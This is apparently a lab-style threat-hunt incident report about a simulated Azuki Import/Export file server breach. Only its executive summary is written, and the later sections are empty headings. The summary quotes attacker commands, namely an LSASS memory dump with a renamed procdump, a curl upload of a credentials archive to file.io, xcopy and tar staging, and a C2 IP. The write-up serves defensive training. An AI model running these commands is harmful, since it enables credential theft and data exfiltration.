<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/2fb944a4-843c-4169-8b62-f8996a89fcfe" />

# Threat-Hunt-Cargo-Hold

# Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
- [Affected Systems & Data](#affected-systems--data)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
- [Immediate Response Actions](#immediate-response-actions)
- [Eradication Measures](#eradication-measures)
- [Recovery Steps](#recovery-steps)
- [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
- [Technical Timeline](#technical-timeline-1)

# Executive Summary
## Incident ID:
- INC2025-0011-019

## Incident Severity:
- Severity 1 (Critical)

## Incident Status:
- Resolved

## Incident Overview:
- After establishing initial access on November 19th, network monitoring detected the attacker returning approximately 72 hours later. Suspicious lateral movement and large data transfers were observed overnight on the file server.

## Key Findings:
- Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumuration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensve evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to a script into the staging directory. The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6:7331` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection. Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletetion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. There is a potential of future impersonation of IT staff and the possibility of customer data being at risk. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. In addition, some API keys were revoked which may have led to a brief period of downtime for customers. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` which housed sensitive employee information, has been identified as a major risk to employees. There have already been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized acccess is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may have ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.

# Technical Analysis
## Affected Systems & Data
## Evidence Sources & Analysis
## Indicators of Compromise (IoCs)
### C2 IP:
## Root Cause Analysis

# Technical Timeline
## Initial Compromise
## Lateral Movement
## Data Access & Exfiltration
## C2 Communications
## Malware Deployment or Activity
## Containment Times
## Eradication Times
## Recovery Times

# Nature of the Attack

## Data Access & Exfiltration

## C2 Communications

## Containment Times

## Eradication Times

## Nature of the Attack


# Impact Analysis

# Response and Recovery Analysis

# Immediate Response Actions
## Revocation of Access
### Identification of Compromised Accounts / Systems:
### Timeframe:
### Method of Revocation:
### Impact:
## Containment Strategy
### Short-Term Containment:
### Long-Term Containment:
### Effectiveness:

# Eradication Measures
## Malware Removal:
## System Patching:
### Vulnerability Identification:
### Patch Management:
### Fallback Proceedures:

# Recovery Steps
## Data Restoration
### Backup Validation:
### Restoration Process:
### Data Integrity Checks:
## System Validation
### Security Measures:
### Operational Checks:

# Post-Incident Actions
## Monitoring
### Enhanced Monitoring Plans:
### Tools and Technologies:
## Lessons Learned
### Gap Analysis:
### Recommendations for Improvement:
### Future Strategy:

# Annex A

# Technical Timeline
|      Time      |                                                              Activity                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------|
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
|                |                                                                                                                                    |
